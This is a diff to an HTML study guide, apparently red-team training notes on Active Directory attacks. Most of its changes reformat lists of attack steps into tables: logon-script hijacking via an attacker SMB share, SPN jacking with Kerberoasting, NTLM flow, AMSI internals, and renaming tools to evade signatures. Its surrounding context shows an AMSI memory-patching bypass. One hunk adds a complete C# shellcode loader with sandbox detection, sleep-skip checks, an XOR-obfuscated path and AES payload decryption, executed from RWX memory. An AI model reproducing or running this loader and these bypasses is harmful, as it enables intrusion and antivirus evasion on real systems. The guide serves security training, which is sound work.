@@ -3980,11 +3980,14 @@ Get-ADUser -LDAPFilter "(scriptPath=*)" -Properties scriptPath | Select-Object s
 
 <h5 id="cape-exploitation-via-writeproperty-7eac90">Exploitation via WriteProperty</h5>
 <p>If the attacker has <code>WriteProperty</code> on the <code>scriptPath</code> attribute (or broader write rights like GenericAll/GenericWrite), they can set it to a UNC path pointing to a malicious script.</p>
-<ol>
-<li>Host a malicious script (e.g., a reverse shell or Beacon stager) on an attacker-controlled SMB share</li>
-<li>Modify the target user's <code>scriptPath</code> to point to the share</li>
-<li>Wait for the user to log in; the script executes in their session</li>
-</ol>
+<table class="custom-table">
+<thead><tr><th>Step</th><th>Action</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Host a malicious script on an attacker-controlled SMB share</td></tr>
+<tr><td>2</td><td>Modify the target user's <code>scriptPath</code> to point to the share</td></tr>
+<tr><td>3</td><td>Wait for the user to log in; the script executes in their session</td></tr>
+</tbody>
+</table>
 
 <h5 id="cape-setting-logon-scripts-via-powerview-f2c4fb">Setting Logon Scripts via PowerView</h5>
 <pre><code class="language-powershell"># Set a logon script using PowerView
@@ -4008,13 +4011,16 @@ Set-DomainObject -Identity targetuser -Set @{scriptPath="original_script.bat"}</
 <p>SPN Jacking is a technique that combines write access over the <code>servicePrincipalName</code> attribute with Kerberoasting. By setting an SPN on a target account that does not already have one, the attacker makes it Kerberoastable and can then crack the service ticket offline to recover the plaintext password.</p>
 
 <h5 id="cape-how-spn-jacking-works-572d3f">How SPN Jacking Works</h5>
-<ol>
-<li>Identify a target user account with a weak password that does not have an SPN set</li>
-<li>Use write access (GenericAll, GenericWrite, WriteProperty on servicePrincipalName) to add an arbitrary SPN</li>
-<li>Request a Kerberos service ticket for the new SPN (Kerberoast)</li>
-<li>Crack the ticket offline to recover the password</li>
-<li>Remove the SPN to clean up</li>
-</ol>
+<table class="custom-table">
+<thead><tr><th>Step</th><th>Action</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Identify a target user account with a weak password that does not have an SPN set</td></tr>
+<tr><td>2</td><td>Use write access such as GenericAll, GenericWrite, or WriteProperty on <code>servicePrincipalName</code> to add an arbitrary SPN</td></tr>
+<tr><td>3</td><td>Request a Kerberos service ticket for the new SPN</td></tr>
+<tr><td>4</td><td>Crack the ticket offline to recover the password</td></tr>
+<tr><td>5</td><td>Remove the SPN to clean up</td></tr>
+</tbody>
+</table>
 
 <h5 id="cape-prerequisites-4aa618">Prerequisites</h5>
 <ul>
@@ -4284,11 +4290,14 @@ python3 pygpoabuse.py corp.local/attacker:'Password123' -gpo-id "AB12CD34-EF56-7
 
 <h3 id="cape-ntlm-authentication-protocol-39322f">9.1 NTLM Authentication Protocol</h3>
 <p>NTLM (NT LAN Manager) is a challenge-response authentication protocol used when Kerberos is unavailable (e.g., when the target is specified by IP address rather than hostname, or when no Active Directory trust path exists). NTLM operates in three message exchanges:</p>
-<ol>
-<li><strong>NEGOTIATE</strong> (Type 1): The client announces supported NTLM features and flags</li>
-<li><strong>CHALLENGE</strong> (Type 2): The server responds with a random 8-byte challenge (nonce) and its own feature flags</li>
-<li><strong>AUTHENTICATE</strong> (Type 3): The client responds with the challenge encrypted using a derivative of the user's NT hash, along with username and domain information</li>
-</ol>
+<table class="custom-table">
+<thead><tr><th>Message</th><th>Description</th></tr></thead>
+<tbody>
+<tr><td>NEGOTIATE (Type 1)</td><td>The client announces supported NTLM features and flags</td></tr>
+<tr><td>CHALLENGE (Type 2)</td><td>The server responds with a random 8-byte challenge nonce and its own feature flags</td></tr>
+<tr><td>AUTHENTICATE (Type 3)</td><td>The client responds with the challenge encrypted using a derivative of the user's NT hash, along with username and domain information</td></tr>
+</tbody>
+</table>
 
 <figure><img src="./img/cape/ntlm-auth-flow.png" alt="NTLM authentication flow between Client, Server, and DC"></figure>
 
@@ -6433,20 +6442,118 @@ WriteProcessMemory(hProcess, remoteAddr, shellcode, shellcode.Length, out _);
 CreateRemoteThread(hProcess, IntPtr.Zero, 0, remoteAddr, IntPtr.Zero, 0, IntPtr.Zero);</code></pre>
   </li>
 </ul>
+
+<h4 id="cape-static-and-dynamic-evasion-complete-loader">Complete Loader Example</h4>
+<pre><code class="language-csharp">using System;
+using System.IO;
+using System.Linq;
+using System.Text;
+using System.Threading;
+using System.Security.Cryptography;
+using System.Runtime.InteropServices;
+using Microsoft.VisualBasic.Devices;
+
+public class Loader
+{
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr VirtualAlloc(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress,
+        IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);
+
+    [DllImport("kernel32.dll", SetLastError = true)]
+    private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);
+
+    private const uint MEM_COMMIT = 0x1000;
+    private const uint MEM_RESERVE = 0x2000;
+    private const uint PAGE_EXECUTE_READWRITE = 0x40;
+    private const uint INFINITE = 0xFFFFFFFF;
+
+    private static string Decode(byte[] data, byte key)
+    {
+        byte[] result = new byte[data.Length];
+        for (int i = 0; i &lt; data.Length; i++)
+            result[i] = (byte)(data[i] ^ key);
+        return Encoding.UTF8.GetString(result);
+    }
+
+    private static bool IsSandbox()
+    {
+        if (new ComputerInfo().TotalPhysicalMemory &lt; 2147483648)
+            return true;
+        if (Environment.ProcessorCount &lt; 2)
+            return true;
+        if (Environment.TickCount &lt; 1200000)
+            return true;
+
+        string user = Environment.UserName.ToLowerInvariant();
+        string[] sandboxUsers = { "sandbox", "malware", "virus", "sample" };
+        return sandboxUsers.Any(user.Contains);
+    }
+
+    private static void SleepWithVerification()
+    {
+        DateTime start = DateTime.Now;
+        Thread.Sleep(120000);
+        if ((DateTime.Now - start).TotalSeconds &lt; 110)
+            Environment.Exit(0);
+    }
+
+    private static byte[] DecryptPayload(byte[] encrypted, string base64Key, string base64Iv)
+    {
+        using (Aes aes = Aes.Create())
+        {
+            aes.Key = Convert.FromBase64String(base64Key);
+            aes.IV = Convert.FromBase64String(base64Iv);
+            using (ICryptoTransform decryptor = aes.CreateDecryptor())
+                return decryptor.TransformFinalBlock(encrypted, 0, encrypted.Length);
+        }
+    }
+
+    private static void Execute(byte[] shellcode)
+    {
+        IntPtr addr = VirtualAlloc(IntPtr.Zero, (uint)shellcode.Length,
+            MEM_COMMIT | MEM_RESERVE, PAGE_EXECUTE_READWRITE);
+        Marshal.Copy(shellcode, 0, addr, shellcode.Length);
+        IntPtr thread = CreateThread(IntPtr.Zero, 0, addr, IntPtr.Zero, 0, IntPtr.Zero);
+        WaitForSingleObject(thread, INFINITE);
+    }
+
+    public static void Main()
+    {
+        if (IsSandbox())
+            return;
+
+        SleepWithVerification();
+
+        string encryptedPath = Decode(new byte[] { 0x31, 0x20, 0x38, 0x2D, 0x2E, 0x20, 0x25, 0x6F, 0x24, 0x2F, 0x22 }, 0x41);
+        byte[] encrypted = File.ReadAllBytes(encryptedPath);
+
+        string key = "[base64-aes-key]";
+        string iv = "[base64-aes-iv]";
+        byte[] shellcode = DecryptPayload(encrypted, key, iv);
+
+        Execute(shellcode);
+    }
+}</code></pre>
 <h3 id="cape-amsi-and-open-source-evasion-079c13">13.3 AMSI and Open-Source Evasion</h3>
 <p>AMSI is a Windows interface that allows applications to submit content to the registered antimalware provider for scanning. It intercepts PowerShell scripts, VBA macros, JavaScript, and .NET assembly loads before execution.</p>
 <h4 id="cape-antimalware-scan-interface-amsi-260e1b">13.3.1 Antimalware Scan Interface (AMSI)</h4>
 <p>AMSI is a Windows interface that allows applications to submit content to the registered antimalware provider for scanning. It intercepts PowerShell scripts, VBA macros, JavaScript, and .NET assembly loads before execution.</p>
 <figure><img src="./img/cape/lsa-runasppl-registry.png" alt="LSA RunAsPPL registry setting"></figure>
 <h5 id="cape-how-amsi-works-fa2bc1">How AMSI Works</h5>
-<p>When a script host (PowerShell, cscript, etc.) executes content, it calls <code>AmsiScanBuffer</code> or <code>AmsiScanString</code> in <code>amsi.dll</code>. The scan result determines whether execution proceeds or is blocked. The scan chain:</p>
-<ol>
-<li>Script host loads <code>amsi.dll</code> and calls <code>AmsiInitialize</code></li>
-<li>Before executing each script block, the host calls <code>AmsiScanBuffer</code></li>
-<li>AMSI forwards the content to the registered antimalware provider (typically Defender)</li>
-<li>The provider returns a verdict: clean, suspicious, or malicious</li>
-<li>The script host blocks execution if the verdict is malicious</li>
-</ol>
+<p>When a script host (PowerShell, cscript, etc.) executes content, it calls <code>AmsiScanBuffer</code> or <code>AmsiScanString</code> in <code>amsi.dll</code>. The scan result determines whether execution proceeds or is blocked.</p>
+<table class="custom-table">
+<thead><tr><th>Step</th><th>Action</th></tr></thead>
+<tbody>
+<tr><td>1</td><td>Script host loads <code>amsi.dll</code> and calls <code>AmsiInitialize</code></td></tr>
+<tr><td>2</td><td>Before executing each script block, the host calls <code>AmsiScanBuffer</code></td></tr>
+<tr><td>3</td><td>AMSI forwards the content to the registered antimalware provider, typically Defender</td></tr>
+<tr><td>4</td><td>The provider returns a verdict: clean, suspicious, or malicious</td></tr>
+<tr><td>5</td><td>The script host blocks execution if the verdict is malicious</td></tr>
+</tbody>
+</table>
 <h5 id="cape-amsi-bypass-techniques-a39f99">AMSI Bypass Techniques</h5>
 <pre><code class="language-powershell"># Memory patching: overwrite AmsiScanBuffer to return AMSI_RESULT_CLEAN
 # This patches the first bytes of AmsiScanBuffer with a return instruction
@@ -6468,14 +6575,17 @@ VirtualProtect(addr, (UIntPtr)5, oldProtect, out _);</code></pre>
 
 <h4 id="cape-open-source-software-evasion-dec9dc">13.3.2 Open-Source Software Evasion</h4>
 <p>Public offensive tools (Rubeus, SharpHound, Mimikatz) have well-known signatures. Using them without modification guarantees detection. Evasion requires modifying the source before compilation.</p>
-<ul>
-<li><strong>String replacement</strong>: rename class names, method names, and embedded strings that serve as signatures</li>
-<li><strong>Namespace changes</strong>: change default namespaces like <code>Rubeus</code> or <code>SharpHound</code></li>
-<li><strong>Remove help text and banners</strong>: ASCII art, version strings, and usage text are signature targets</li>
-<li><strong>Change GUIDs and assembly metadata</strong>: modify AssemblyInfo.cs values</li>
-<li><strong>Obfuscation tools</strong>: ConfuserEx, InvisibilityCloak for .NET; Veil, Scarecrow for payload generation</li>
-<li><strong>Recompile from source</strong>: building from source with modifications produces a unique binary hash</li>
-</ul>
+<table class="custom-table">
+<thead><tr><th>Modification</th><th>Purpose</th></tr></thead>
+<tbody>
+<tr><td>String replacement</td><td>Rename class names, method names, and embedded strings that serve as signatures</td></tr>
+<tr><td>Namespace changes</td><td>Change default namespaces like <code>Rubeus</code> or <code>SharpHound</code></td></tr>
+<tr><td>Remove help text and banners</td><td>Remove ASCII art, version strings, and usage text that can become signature targets</td></tr>
+<tr><td>Change GUIDs and assembly metadata</td><td>Modify <code>AssemblyInfo.cs</code> values and project metadata</td></tr>
+<tr><td>Obfuscation tools</td><td>Use ConfuserEx or InvisibilityCloak for .NET, and Veil or Scarecrow for payload generation</td></tr>
+<tr><td>Recompile from source</td><td>Build from source after modifications to produce a unique binary hash</td></tr>
+</tbody>
+</table>
 <pre><code class="language-bash"># Example: modify and recompile Rubeus
 git clone https://github.com/GhostPack/Rubeus.git
 cd Rubeus
